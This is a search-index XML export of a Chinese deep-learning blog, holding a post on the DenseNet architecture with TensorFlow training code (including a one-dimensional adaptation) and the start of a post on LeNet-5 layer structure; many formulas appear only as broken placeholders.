<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DenseNet神经网络结构]]></title>
    <url>%2F2020%2F02%2F09%2Fdensenet%2F</url>
    <content type="text"><![CDATA[CVPR 2017最佳论文DenseNet，论文中提出的DenseNet（Dense Convolutional Network） 。 作为CVPR2017年的Best Paper, DenseNet脱离了加深网络层数(ResNet)和加宽网络结构(Inception)来提升网络性能的定式思维,从特征的角度考虑,通过特征重用和旁路(Bypass)设置,既大幅度减少了网络的参数量,又在一定程度上缓解了gradient vanishing（梯度消失）问题的产生.结合信息流和特征复用的假设,DenseNet当之无愧成为2017年计算机视觉顶会的年度最佳论文. 随着CNN网络层数的不断增加,gradient vanishing和model degradation（模型退化）问题出现在了人们面前,BatchNormalization（批规范化）的广泛使用在一定程度上缓解了gradient vanishing的问题,而ResNet和Highway Networks通过构造恒等映射设置旁路,进一步减少了gradient vanishing和model degradation的产生.Fractal Nets通过将不同深度的网络并行化,在获得了深度的同时保证了梯度的传播,随机深度网络通过对网络中一些层进行失活,既证明了ResNet深度的冗余性,又缓解了上述问题的产生. 虽然这些不同的网络框架通过不同的实现加深的网络层数,但是他们都包含了相同的核心思想,既将feature map进行跨网络层的连接. 优点 减轻了vanishing-gradient（梯度消失） 加强了feature的传递 更有效地利用了feature 一定程度上较少了参数数量 设计理念相比ResNet，DenseNet提出了一个更激进的密集连接机制：即互相连接所有的层，具体来说就是每个层都会接受其前面所有层作为其额外的输入。图1为ResNet网络的连接机制，作为对比，图2为DenseNet的密集连接机制。可以看到，ResNet是每个层与前面的某层（一般是2~3层）短路连接在一起，连接方式是通过元素级相加。而在DenseNet中，每个层都会与前面所有层在channel维度上连接（concat）在一起（这里各个层的特征图大小是相同的，后面会有说明），并作为下一层的输入。对于一个 L层的网络，DenseNet共包含 个连接，相比ResNet，这是一种密集连接。而且DenseNet是直接concat来自不同层的特征图，这可以实现特征重用，提升效率，这一特点是DenseNet与ResNet最主要的区别。 图1 ResNet网络的短路连接机制（其中+代表的是元素级相加操作） 1foX6g.png 图2 DenseNet网络的密集连接机制（其中c代表的是channel级连接操作） 如果用公式表示的话，传统的网络在 [公式] 层的输出为： [公式] 而对于ResNet，增加了来自上一层输入的identity函数： [公式] 在DenseNet中，会连接前面所有层作为输入： [公式] 其中，上面的 [公式]](https://www.zhihu.com/equation?tex=H_l%28%5Ccdot%29) 代表是非线性转化函数（non-liear transformation），它是一个组合操作，其可能包括一系列的BN(Batch Normalization)，ReLU，Pooling及Conv操作。注意这里 ![[公式]](https://www.zhihu.com/equation?tex=l) 层与 ![[公式] 层之间可能实际上包含多个卷积层。 DenseNet的前向过程如图3所示，可以更直观地理解其密集连接方式，比如 [公式]](https://www.zhihu.com/equation?tex=h_3) 的输入不仅包括来自 ![[公式]](https://www.zhihu.com/equation?tex=h_2) 的 ![[公式]](https://www.zhihu.com/equation?tex=x_2) ，还包括前面两层的 ![[公式]](https://www.zhihu.com/equation?tex=x_1) 和 ![[公式] ，它们是在channel维度上连接在一起的。 网络结构 如图所示，DenseNet的网络结构主要由DenseBlock和Transition组成。 img 在DenseBlock中，各个层的特征图大小一致，可以在channel维度上连接。DenseBlock中的非线性组合函数 [公式]](https://www.zhihu.com/equation?tex=H%28%5Ccdot%29) 采用的是**BN+ReLU+3x3 Conv**的结构，如图所示。另外值得注意的一点是，与ResNet不同，所有DenseBlock中各个层卷积之后均输出 ![[公式]](https://www.zhihu.com/equation?tex=k) 个特征图，即得到的特征图的channel数为 ![[公式]](https://www.zhihu.com/equation?tex=k) ，或者说采用 ![[公式]](https://www.zhihu.com/equation?tex=k) 个卷积核。 ![[公式]](https://www.zhihu.com/equation?tex=k) 在DenseNet称为growth rate，这是一个超参数。一般情况下使用较小的 ![[公式]](https://www.zhihu.com/equation?tex=k) （比如12），就可以得到较佳的性能。假定输入层的特征图的channel数为 ![[公式]](https://www.zhihu.com/equation?tex=k_0) ，那么 ![[公式]](https://www.zhihu.com/equation?tex=l) 层输入的channel数为 ![[公式]](https://www.zhihu.com/equation?tex=k_0%2Bk%28l-1%29) ，因此随着层数增加，尽管 ![[公式]](https://www.zhihu.com/equation?tex=k) 设定得较小，DenseBlock的输入会非常多，不过这是由于特征重用所造成的，每个层仅有 ![[公式] 个特征是自己独有的。 由于后面层的输入会非常大，DenseBlock内部可以采用bottleneck层来减少计算量，主要是原有的结构中增加1x1 Conv，如图所示，即BN+ReLU+1x1 Conv+BN+ReLU+3x3 Conv，称为DenseNet-B结构。其中1x1 Conv得到 [公式] 个特征图它起到的作用是降低特征数量，从而提升计算效率。 对于Transition层，它主要是连接两个相邻的DenseBlock，并且降低特征图大小。Transition层包括一个1x1的卷积和2x2的AvgPooling，结构为BN+ReLU+1x1 Conv+2x2 AvgPooling。另外，Transition层可以起到压缩模型的作用。假定Transition的上接DenseBlock得到的特征图channels数为 [公式]](https://www.zhihu.com/equation?tex=m) ，Transition层可以产生 ![[公式]](https://www.zhihu.com/equation?tex=%5Clfloor%5Ctheta+m%5Crfloor) 个特征（通过卷积层），其中 ![[公式]](https://www.zhihu.com/equation?tex=%5Ctheta+%5Cin+%280%2C1%5D) 是压缩系数（compression rate）。当 ![[公式]](https://www.zhihu.com/equation?tex=%5Ctheta%3D1) 时，特征个数经过Transition层没有变化，即无压缩，而当压缩系数小于1时，这种结构称为DenseNet-C，文中使用 ![[公式] 。对于使用bottleneck层的DenseBlock结构和压缩系数小于1的Transition组合结构称为DenseNet-BC。 DenseNet共在三个图像分类数据集（CIFAR，SVHN和ImageNet）上进行测试。对于前两个数据集，其输入图片大小为 [公式]](https://www.zhihu.com/equation?tex=32%5Ctimes+32) ，所使用的DenseNet在进入第一个DenseBlock之前，首先进行进行一次3x3卷积（stride=1），卷积核数为16（对于DenseNet-BC为 ![[公式]](https://www.zhihu.com/equation?tex=2k) ）。DenseNet共包含三个DenseBlock，各个模块的特征图大小分别为 ![[公式]](https://www.zhihu.com/equation?tex=32%5Ctimes+32) ， ![[公式]](https://www.zhihu.com/equation?tex=16%5Ctimes+16) 和 ![[公式]](https://www.zhihu.com/equation?tex=8%5Ctimes+8) ，每个DenseBlock里面的层数相同。最后的DenseBlock之后是一个global AvgPooling层，然后送入一个softmax分类器。注意，在DenseNet中，所有的3x3卷积均采用padding=1的方式以保证特征图大小维持不变。对于基本的DenseNet，使用如下三种网络配置： ![[公式]](https://www.zhihu.com/equation?tex=%5C%7BL%3D40%2C+k%3D12%5C%7D) , ![[公式]](https://www.zhihu.com/equation?tex=%5C%7BL%3D100%2C+k%3D12%5C%7D) ， ![[公式]](https://www.zhihu.com/equation?tex=%5C%7BL%3D40%2C+k%3D24%5C%7D) 。而对于DenseNet-BC结构，使用如下三种网络配置： ![[公式]](https://www.zhihu.com/equation?tex=%5C%7BL%3D100%2C+k%3D12%5C%7D) , ![[公式]](https://www.zhihu.com/equation?tex=%5C%7BL%3D250%2C+k%3D24%5C%7D) ， ![[公式]](https://www.zhihu.com/equation?tex=%5C%7BL%3D190%2C+k%3D40%5C%7D) 。这里的 ![[公式]](https://www.zhihu.com/equation?tex=L) 指的是网络总层数（网络深度），一般情况下，我们只把带有训练参数的层算入其中，而像Pooling这样的无参数层不纳入统计中，此外BN层尽管包含参数但是也不单独统计，而是可以计入它所附属的卷积层。对于普通的 ![[公式] 网络，除去第一个卷积层、2个Transition中卷积层以及最后的Linear层，共剩余36层，均分到三个DenseBlock可知每个DenseBlock包含12层。其它的网络配置同样可以算出各个DenseBlock所含层数。 对于ImageNet数据集，图片输入大小为 [公式]](https://www.zhihu.com/equation?tex=224%5Ctimes+224) ，网络结构采用包含4个DenseBlock的DenseNet-BC，其首先是一个stride=2的7x7卷积层（卷积核数为 ![[公式] ），然后是一个stride=2的3x3 MaxPooling层，后面才进入DenseBlock。ImageNet数据集所采用的网络配置如表所示： 代码实现import tensorflow as tf from tflearn.layers.conv import global_avg_pool from tensorflow.contrib.layers import batch_norm, flatten from tensorflow.contrib.layers import xavier_initializer from tensorflow.contrib.framework import arg_scope from cifar10 import * # Hyperparameter growth_k = 24 nb_block = 2 # how many (dense block + Transition Layer) ? init_learning_rate = 1e-4 epsilon = 1e-4 # AdamOptimizer epsilon dropout_rate = 0.2 # Momentum Optimizer will use nesterov_momentum = 0.9 weight_decay = 1e-4 # Label &amp; batch_size batch_size = 64 iteration = 782 # batch_size * iteration = data_set_number test_iteration = 10 total_epochs = 300 def conv_layer(input, filter, kernel, stride=1, layer_name=&quot;conv&quot;): with tf.name_scope(layer_name): network = tf.layers.conv2d(inputs=input, use_bias=False, filters=filter, kernel_size=kernel, strides=stride, padding=&#39;SAME&#39;) return network def Global_Average_Pooling(x, stride=1): &quot;&quot;&quot; width = np.shape(x)[1] height = np.shape(x)[2] pool_size = [width, height] return tf.layers.average_pooling2d(inputs=x, pool_size=pool_size, strides=stride) # The stride value does not matter It is global average pooling without tflearn &quot;&quot;&quot; return global_avg_pool(x, name=&#39;Global_avg_pooling&#39;) # But maybe you need to install h5py and curses or not def Batch_Normalization(x, training, scope): with arg_scope([batch_norm], scope=scope, updates_collections=None, decay=0.9, center=True, scale=True, zero_debias_moving_mean=True) : return tf.cond(training, lambda : batch_norm(inputs=x, is_training=training, reuse=None), lambda : batch_norm(inputs=x, is_training=training, reuse=True)) def Drop_out(x, rate, training) : return tf.layers.dropout(inputs=x, rate=rate, training=training) def Relu(x): return tf.nn.relu(x) def Average_pooling(x, pool_size=[2,2], stride=2, padding=&#39;VALID&#39;): return tf.layers.average_pooling2d(inputs=x, pool_size=pool_size, strides=stride, padding=padding) def Max_Pooling(x, pool_size=[3,3], stride=2, padding=&#39;VALID&#39;): return tf.layers.max_pooling2d(inputs=x, pool_size=pool_size, strides=stride, padding=padding) def Concatenation(layers) : return tf.concat(layers, axis=3) def Linear(x) : return tf.layers.dense(inputs=x, units=class_num, name=&#39;linear&#39;) def Evaluate(sess): test_acc = 0.0 test_loss = 0.0 test_pre_index = 0 add = 1000 for it in range(test_iteration): test_batch_x = test_x[test_pre_index: test_pre_index + add] test_batch_y = test_y[test_pre_index: test_pre_index + add] test_pre_index = test_pre_index + add test_feed_dict = { x: test_batch_x, label: test_batch_y, learning_rate: epoch_learning_rate, training_flag: False } loss_, acc_ = sess.run([cost, accuracy], feed_dict=test_feed_dict) test_loss += loss_ / 10.0 test_acc += acc_ / 10.0 summary = tf.Summary(value=[tf.Summary.Value(tag=&#39;test_loss&#39;, simple_value=test_loss), tf.Summary.Value(tag=&#39;test_accuracy&#39;, simple_value=test_acc)]) return test_acc, test_loss, summary class DenseNet(): def __init__(self, x, nb_blocks, filters, training): self.nb_blocks = nb_blocks self.filters = filters self.training = training self.model = self.Dense_net(x) def bottleneck_layer(self, x, scope): # print(x) with tf.name_scope(scope): x = Batch_Normalization(x, training=self.training, scope=scope+&#39;_batch1&#39;) x = Relu(x) x = conv_layer(x, filter=4 * self.filters, kernel=[1,1], layer_name=scope+&#39;_conv1&#39;) x = Drop_out(x, rate=dropout_rate, training=self.training) x = Batch_Normalization(x, training=self.training, scope=scope+&#39;_batch2&#39;) x = Relu(x) x = conv_layer(x, filter=self.filters, kernel=[3,3], layer_name=scope+&#39;_conv2&#39;) x = Drop_out(x, rate=dropout_rate, training=self.training) # print(x) return x def transition_layer(self, x, scope): with tf.name_scope(scope): x = Batch_Normalization(x, training=self.training, scope=scope+&#39;_batch1&#39;) x = Relu(x) # x = conv_layer(x, filter=self.filters, kernel=[1,1], layer_name=scope+&#39;_conv1&#39;) # https://github.com/taki0112/Densenet-Tensorflow/issues/10 in_channel = x.shape[-1] x = conv_layer(x, filter=in_channel*0.5, kernel=[1,1], layer_name=scope+&#39;_conv1&#39;) x = Drop_out(x, rate=dropout_rate, training=self.training) x = Average_pooling(x, pool_size=[2,2], stride=2) return x def dense_block(self, input_x, nb_layers, layer_name): with tf.name_scope(layer_name): layers_concat = list() layers_concat.append(input_x) x = self.bottleneck_layer(input_x, scope=layer_name + &#39;_bottleN_&#39; + str(0)) layers_concat.append(x) for i in range(nb_layers - 1): x = Concatenation(layers_concat) x = self.bottleneck_layer(x, scope=layer_name + &#39;_bottleN_&#39; + str(i + 1)) layers_concat.append(x) x = Concatenation(layers_concat) return x def Dense_net(self, input_x): x = conv_layer(input_x, filter=2 * self.filters, kernel=[7,7], stride=2, layer_name=&#39;conv0&#39;) # x = Max_Pooling(x, pool_size=[3,3], stride=2) &quot;&quot;&quot; for i in range(self.nb_blocks) : # 6 -&gt; 12 -&gt; 48 x = self.dense_block(input_x=x, nb_layers=4, layer_name=&#39;dense_&#39;+str(i)) x = self.transition_layer(x, scope=&#39;trans_&#39;+str(i)) &quot;&quot;&quot; x = self.dense_block(input_x=x, nb_layers=6, layer_name=&#39;dense_1&#39;) x = self.transition_layer(x, scope=&#39;trans_1&#39;) x = self.dense_block(input_x=x, nb_layers=12, layer_name=&#39;dense_2&#39;) x = self.transition_layer(x, scope=&#39;trans_2&#39;) x = self.dense_block(input_x=x, nb_layers=48, layer_name=&#39;dense_3&#39;) x = self.transition_layer(x, scope=&#39;trans_3&#39;) x = self.dense_block(input_x=x, nb_layers=32, layer_name=&#39;dense_final&#39;) # 100 Layer x = Batch_Normalization(x, training=self.training, scope=&#39;linear_batch&#39;) x = Relu(x) x = Global_Average_Pooling(x) x = flatten(x) x = Linear(x) # x = tf.reshape(x, [-1, 10]) return x train_x, train_y, test_x, test_y = prepare_data() train_x, test_x = color_preprocessing(train_x, test_x) # image_size = 32, img_channels = 3, class_num = 10 in cifar10 x = tf.placeholder(tf.float32, shape=[None, image_size, image_size, img_channels]) label = tf.placeholder(tf.float32, shape=[None, class_num]) training_flag = tf.placeholder(tf.bool) learning_rate = tf.placeholder(tf.float32, name=&#39;learning_rate&#39;) logits = DenseNet(x=x, nb_blocks=nb_block, filters=growth_k, training=training_flag).model cost = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=label, logits=logits)) &quot;&quot;&quot; l2_loss = tf.add_n([tf.nn.l2_loss(var) for var in tf.trainable_variables()]) optimizer = tf.train.MomentumOptimizer(learning_rate=learning_rate, momentum=nesterov_momentum, use_nesterov=True) train = optimizer.minimize(cost + l2_loss * weight_decay) In paper, use MomentumOptimizer init_learning_rate = 0.1 but, I&#39;ll use AdamOptimizer &quot;&quot;&quot; optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate, epsilon=epsilon) train = optimizer.minimize(cost) correct_prediction = tf.equal(tf.argmax(logits, 1), tf.argmax(label, 1)) accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32)) saver = tf.train.Saver(tf.global_variables()) with tf.Session() as sess: ckpt = tf.train.get_checkpoint_state(&#39;./model&#39;) if ckpt and tf.train.checkpoint_exists(ckpt.model_checkpoint_path): saver.restore(sess, ckpt.model_checkpoint_path) else: sess.run(tf.global_variables_initializer()) summary_writer = tf.summary.FileWriter(&#39;./logs&#39;, sess.graph) epoch_learning_rate = init_learning_rate for epoch in range(1, total_epochs + 1): if epoch == (total_epochs * 0.5) or epoch == (total_epochs * 0.75): epoch_learning_rate = epoch_learning_rate / 10 pre_index = 0 train_acc = 0.0 train_loss = 0.0 for step in range(1, iteration + 1): if pre_index+batch_size &lt; 50000 : batch_x = train_x[pre_index : pre_index+batch_size] batch_y = train_y[pre_index : pre_index+batch_size] else : batch_x = train_x[pre_index : ] batch_y = train_y[pre_index : ] batch_x = data_augmentation(batch_x) train_feed_dict = { x: batch_x, label: batch_y, learning_rate: epoch_learning_rate, training_flag : True } _, batch_loss = sess.run([train, cost], feed_dict=train_feed_dict) batch_acc = accuracy.eval(feed_dict=train_feed_dict) train_loss += batch_loss train_acc += batch_acc pre_index += batch_size if step == iteration : train_loss /= iteration # average loss train_acc /= iteration # average accuracy train_summary = tf.Summary(value=[tf.Summary.Value(tag=&#39;train_loss&#39;, simple_value=train_loss), tf.Summary.Value(tag=&#39;train_accuracy&#39;, simple_value=train_acc)]) test_acc, test_loss, test_summary = Evaluate(sess) summary_writer.add_summary(summary=train_summary, global_step=epoch) summary_writer.add_summary(summary=test_summary, global_step=epoch) summary_writer.flush() line = &quot;epoch: %d/%d, train_loss: %.4f, train_acc: %.4f, test_loss: %.4f, test_acc: %.4f \n&quot; % ( epoch, total_epochs, train_loss, train_acc, test_loss, test_acc) print(line) with open(&#39;logs.txt&#39;, &#39;a&#39;) as f : f.write(line) saver.save(sess=sess, save_path=&#39;./model/dense.ckpt&#39;) 一维代码由于我做的是一维数据识别，需要将代码改为一维，和修改数据读入。 修改下面部分即可改变网络结构，由于电脑显卡太差，原论文中的结构会因为显存不够而报错。 def Dense_net(self, input_x): x = conv_layer(input_x, filter=2 * self.filters, kernel=[1, 7], stride=2, layer_name=&#39;conv0&#39;)#卷积 x = Max_Pooling(x, pool_size=[1, 3], stride=2)#最大池化 for i in range(self.nb_blocks): # 6 -&gt; 12 -&gt; 48 x = self.dense_block(input_x=x, nb_layers=2, layer_name=&#39;dense_&#39; + str(i)) x = self.transition_layer(x, scope=&#39;trans_&#39; + str(i)) &quot;&quot;&quot; x = self.dense_block(input_x=x, nb_layers=6, layer_name=&#39;dense_1&#39;) x = self.transition_layer(x, scope=&#39;trans_1&#39;) x = self.dense_block(input_x=x, nb_layers=12, layer_name=&#39;dense_2&#39;) x = self.transition_layer(x, scope=&#39;trans_2&#39;) x = self.dense_block(input_x=x, nb_layers=48, layer_name=&#39;dense_3&#39;) x = self.transition_layer(x, scope=&#39;trans_3&#39;) &quot;&quot;&quot; x = self.dense_block(input_x=x, nb_layers=4, layer_name=&#39;dense_final&#39;) # 100 Layer x = Batch_Normalization(x, training=self.training, scope=&#39;linear_batch&#39;) x = Relu(x) x = Global_Average_Pooling(x) x = flatten(x) x = Linear(x) # x = tf.reshape(x, [-1, 10]) return x 完整代码import tensorflow as tf from tflearn.layers.conv import global_avg_pool from tensorflow.examples.tutorials.mnist import input_data from tensorflow.contrib.layers import batch_norm, flatten from tensorflow.contrib.framework import arg_scope import numpy as np import matplotlib.pyplot as plt # Hyperparameter growth_k = 12 nb_block = 1 # how many (dense block + Transition Layer) ? init_learning_rate = 1e-3 epsilon = 1e-8 # AdamOptimizer epsilon dropout_rate = 0.2 # Momentum Optimizer will use nesterov_momentum = 0.9 weight_decay = 1e-4 # Label &amp; batch_size class_num = 2 total_epochs = 400 DATA_SIZE = 1175 BATCH_SIZE =128 acc_print=[] acc_printx=[] acc_printy=[] tf.reset_default_graph() def conv_layer(input, filter, kernel, stride=1, layer_name=&quot;conv&quot;): with tf.name_scope(layer_name): network = tf.layers.conv2d(inputs=input, filters=filter, kernel_size=kernel, strides=stride, padding=&#39;SAME&#39;) return network def Global_Average_Pooling(x, stride=1): &quot;&quot;&quot; width = np.shape(x)[1] height = np.shape(x)[2] pool_size = [width, height] return tf.layers.average_pooling2d(inputs=x, pool_size=pool_size, strides=stride) # The stride value does not matter It is global average pooling without tflearn &quot;&quot;&quot; return global_avg_pool(x, name=&#39;Global_avg_pooling&#39;) # But maybe you need to install h5py and curses or not def Batch_Normalization(x, training, scope): with arg_scope([batch_norm], scope=scope, updates_collections=None, decay=0.9, center=True, scale=True, zero_debias_moving_mean=True): return tf.cond(training, lambda: batch_norm(inputs=x, is_training=training, reuse=None), lambda: batch_norm(inputs=x, is_training=training, reuse=True)) def Drop_out(x, rate, training): return tf.layers.dropout(inputs=x, rate=rate, training=training) def Relu(x): return tf.nn.relu(x) def Average_pooling(x, pool_size=[1, 2], stride=2, padding=&#39;VALID&#39;): return tf.layers.average_pooling2d(inputs=x, pool_size=pool_size, strides=stride, padding=padding) def Max_Pooling(x, pool_size=[1, 3], stride=2, padding=&#39;VALID&#39;): return tf.layers.max_pooling2d(inputs=x, pool_size=pool_size, strides=stride, padding=padding) def Concatenation(layers): return tf.concat(layers, axis=3) def Linear(x): return tf.layers.dense(inputs=x, units=class_num, name=&#39;linear&#39;) class DenseNet(): def __init__(self, x, nb_blocks, filters, training): self.nb_blocks = nb_blocks self.filters = filters self.training = training self.model = self.Dense_net(x) def bottleneck_layer(self, x, scope): # print(x) with tf.name_scope(scope): x = Batch_Normalization(x, training=self.training, scope=scope + &#39;_batch1&#39;) x = Relu(x) x = conv_layer(x, filter=4 * self.filters, kernel=[1, 1], layer_name=scope + &#39;_conv1&#39;) x = Drop_out(x, rate=dropout_rate, training=self.training) x = Batch_Normalization(x, training=self.training, scope=scope + &#39;_batch2&#39;) x = Relu(x) x = conv_layer(x, filter=self.filters, kernel=[1, 3], layer_name=scope + &#39;_conv2&#39;) x = Drop_out(x, rate=dropout_rate, training=self.training) # print(x) return x def transition_layer(self, x, scope): with tf.name_scope(scope): x = Batch_Normalization(x, training=self.training, scope=scope + &#39;_batch1&#39;) x = Relu(x) x = conv_layer(x, filter=self.filters, kernel=[1,1], layer_name=scope+&#39;_conv1&#39;) # https://github.com/taki0112/Densenet-Tensorflow/issues/10 #in_channel = x.shape[-1] #x = conv_layer(x, filter=in_channel * 1, kernel=[1, 1], layer_name=scope + &#39;_conv1&#39;) x = Drop_out(x, rate=dropout_rate, training=self.training) x = Average_pooling(x, pool_size=[1, 2], stride=2) return x def dense_block(self, input_x, nb_layers, layer_name): with tf.name_scope(layer_name): layers_concat = list() layers_concat.append(input_x) x = self.bottleneck_layer(input_x, scope=layer_name + &#39;_bottleN_&#39; + str(0)) layers_concat.append(x) for i in range(nb_layers - 1): x = Concatenation(layers_concat) x = self.bottleneck_layer(x, scope=layer_name + &#39;_bottleN_&#39; + str(i + 1)) layers_concat.append(x) x = Concatenation(layers_concat) return x def Dense_net(self, input_x): x = conv_layer(input_x, filter=2 * self.filters, kernel=[1, 7], stride=2, layer_name=&#39;conv0&#39;)#卷积 x = Max_Pooling(x, pool_size=[1, 3], stride=2)#最大池化 for i in range(self.nb_blocks): # 6 -&gt; 12 -&gt; 48 x = self.dense_block(input_x=x, nb_layers=2, layer_name=&#39;dense_&#39; + str(i)) x = self.transition_layer(x, scope=&#39;trans_&#39; + str(i)) &quot;&quot;&quot; x = self.dense_block(input_x=x, nb_layers=6, layer_name=&#39;dense_1&#39;) x = self.transition_layer(x, scope=&#39;trans_1&#39;) x = self.dense_block(input_x=x, nb_layers=12, layer_name=&#39;dense_2&#39;) x = self.transition_layer(x, scope=&#39;trans_2&#39;) x = self.dense_block(input_x=x, nb_layers=48, layer_name=&#39;dense_3&#39;) x = self.transition_layer(x, scope=&#39;trans_3&#39;) &quot;&quot;&quot; x = self.dense_block(input_x=x, nb_layers=4, layer_name=&#39;dense_final&#39;) # 100 Layer x = Batch_Normalization(x, training=self.training, scope=&#39;linear_batch&#39;) x = Relu(x) x = Global_Average_Pooling(x) x = flatten(x) x = Linear(x) # x = tf.reshape(x, [-1, 10]) return x def convert_to_one_hot(Y, C): #转为1位热码编码 Y = np.eye(C)[Y.reshape(-1)].T return Y string0=np.loadtxt(&#39;4.30+5.1.txt&#39;,dtype=np.float32) trainy=string0[:,0].reshape(-1,1).T #1行 trainx=string0[:,1:].reshape(1175,-1) trainy= convert_to_one_hot(trainy.astype(int), 2).T x = tf.placeholder(tf.float32, shape=[None, 500]) batch_images = tf.reshape(x, [-1,1,500,1]) label = tf.placeholder(tf.float32, shape=[None, 2]) training_flag = tf.placeholder(tf.bool) learning_rate = tf.placeholder(tf.float32, name=&#39;learning_rate&#39;) logits = DenseNet(x=batch_images, nb_blocks=nb_block, filters=growth_k, training=training_flag).model cost = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=label, logits=logits)) &quot;&quot;&quot; l2_loss = tf.add_n([tf.nn.l2_loss(var) for var in tf.trainable_variables()]) optimizer = tf.train.MomentumOptimizer(learning_rate=learning_rate, momentum=nesterov_momentum, use_nesterov=True) train = optimizer.minimize(cost + l2_loss * weight_decay) In paper, use MomentumOptimizer init_learning_rate = 0.1 but, I&#39;ll use AdamOptimizer &quot;&quot;&quot; optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate, epsilon=epsilon) train = optimizer.minimize(cost) correct_prediction = tf.equal(tf.argmax(logits, 1), tf.argmax(label, 1)) accuracy = tf.reduce_mean(tf.cast(correct_prediction, &quot;float&quot;)) tf.summary.scalar(&#39;loss&#39;, cost) tf.summary.scalar(&#39;accuracy&#39;, accuracy) saver = tf.train.Saver(tf.global_variables()) with tf.Session() as sess: ckpt = tf.train.get_checkpoint_state(&#39;./model&#39;) if ckpt and tf.train.checkpoint_exists(ckpt.model_checkpoint_path): #寻找模型路径 saver.restore(sess, ckpt.model_checkpoint_path) else: sess.run(tf.global_variables_initializer()) merged = tf.summary.merge_all() #合并默认图中收集的所有摘要。 writer = tf.summary.FileWriter(&#39;./logs&#39;, sess.graph) #指定一个文件用来保存图 global_step = 0 epoch_learning_rate = init_learning_rate i=1 for epoch in range(total_epochs): if epoch == (total_epochs * 0.5) or epoch == (total_epochs * 0.75): epoch_learning_rate = epoch_learning_rate / 10 total_batch =10 #训练总次数 for step in range(total_batch): start = (step * BATCH_SIZE) % DATA_SIZE end = min(start + BATCH_SIZE, DATA_SIZE) # 每次选取batch_size个样本进行训练 # _, loss_value, step = sess.run([train_op, loss, global_step], feed_dict={x: trainx[start: end], y_: trainy[start: end]}) batch_x =trainx[start: end] batch_y =trainy[start: end] train_feed_dict = { x: batch_x, label: batch_y, learning_rate: epoch_learning_rate, training_flag: True } _, loss = sess.run([train, cost], feed_dict=train_feed_dict) if epoch % 10 == 0: global_step += 100 train_summary, train_accuracy = sess.run( [merged,accuracy], feed_dict=train_feed_dict) #t_accuracy = sess.run(accuracy,feed_dict={x:batch_x,label:batch_y}) print(&quot;Step:&quot;, epoch, &quot;Loss:&quot;, loss, &quot;Training accuracy:&quot;, train_accuracy) writer.add_summary(train_summary, global_step=epoch) acc_print.append(train_accuracy) acc_printy.append(loss) acc_printx.append(i) i+=1 test_feed_dict = { x: trainx[start:end], label: trainy[start:end], learning_rate: epoch_learning_rate, training_flag: False } #accuracy_rates = sess.run(accuracy, feed_dict=test_feed_dict) #print(&#39;Epoch:&#39;, &#39;%04d&#39; % (epoch + 1), &#39;/ Accuracy =&#39;, accuracy_rates) # writer.add_summary(test_summary, global_step=epoch) plt.title(&quot;trend of accuracy&quot;) plt.plot(acc_printx,acc_print,color=&#39;r&#39;) plt.plot(acc_printx,acc_printy,color=&#39;cyan&#39;) plt.show() saver.save(sess=sess, save_path=&#39;./model/dense.ckpt&#39;) 运行结果 准确率和loss值 不得不说还是很强大的。 参考连接 https://zhuanlan.zhihu.com/p/37189203 https://www.cnblogs.com/skyfsm/p/8451834.html https://github.com/taki0112/Densenet-Tensorflow 🚩推荐阅读Lenet-5卷积神经网络结构BERT的前世今生BERT的前世今生]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>Deep Learning</tag>
        <tag>神经网络</tag>
        <tag>DenseNet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lenet-5卷积神经网络结构]]></title>
    <url>%2F2020%2F01%2F14%2Flenet-5%2F</url>
    <content type="text"><![CDATA[最近在写大创论文，涉及到神经网络结构分析，记录一下（第一次写期刊论文是真不会呀，作图工具都不知道，第一个想到的居然是PPT…..) Lenet-5基本结构 lXGMTI.png LeNet-5共有7层，不包含输入，每层都包含可训练参数（连接权重）。输入图像为32*32大小。这要比Mnist数据库（一个公认的手写数据库）中最大的字母还大。这样做的原因是希望潜在的明显特征如笔画断电或角点能够出现在最高层特征监测子感受野的中心。 卷积层卷积层采用的都是5x5大小的卷积核/过滤器，且卷积核每次滑动一个像素，一个特征图谱使用同一个卷积核. 每个上层节点的值乘以连接上的参数，把这些乘积及一个偏置参数相加得到一个和，把该和输入激活函数，激活函数的输出即是下一层节点的值 。 池化层下抽样层采用的是2x2的输入域，即上一层的4个节点作为下一层1个节点的输入，且输入域不重叠，即每次滑动2个像素，下抽样节点的结构如下： 上图显示的是一种池化方式，但是lenet-5采用的是最大池化，直白点说就是四个格子取最大的值。 得出的值乘以一个参数加上一个偏置参数作为激活函数的输入，激活函数的输出即是下一层节点的值。 LeNet-5第一层：卷积层C1输入图片：32×32 卷积核大小：5×5 卷积核种类：6 输出featuremap大小：28*28 （32-5+1） 神经元数量：28×28×6 可训练参数：（5×5+1）×6（每个滤波器5*5=25个unit参数和一个bias参数，一共6个滤波器） 连接数：（5×5+1）×6×28×28 C1层是卷积层，形成6个特征图谱。卷积的输入区域大小是5x5，每个特征图谱内参数共享，即每个特征图谱内只使用一个共同卷积核，卷积核有5x5个连接参数加上1个偏置共26个参数。卷积区域每次滑动一个像素，这样卷积层形成的每个特征图谱大小是(32-5)/1+1=28x28。C1层共有26x6=156个训练参数，有(5x5+1)x28x28x6=122304个连接。 LeNet-5第二层：池化层S2输入：28×28 采样区域：2×2 采样方式：4个输入相加，乘以一个可训练参数，再加上一个可训练偏置。结果通过sigmoid 采样种类：6 输出featureMap大小：14×14（28/2） 神经元数量：14×14×6 可训练参数：2×6（和的权+偏置） 连接数：（2×2+1）×6×14×14 S2中每个特征图的大小是C1中特征图大小的1/4 S2层是一个下采样层。C1层的6个28x28的特征图谱分别进行以2x2为单位的下抽样得到6个14x14（（28-2）/2+1）的图。每个特征图谱使用一个下抽样核。5（S2中的每个像素都与C1中的2∗2个像素和1个偏置相连接）x14x14x6=5880个连接。 为什么是下采样？利用图像局部相关性的原理，对图像进行子抽样，可以减少数据处理量同时保留有用信息 。 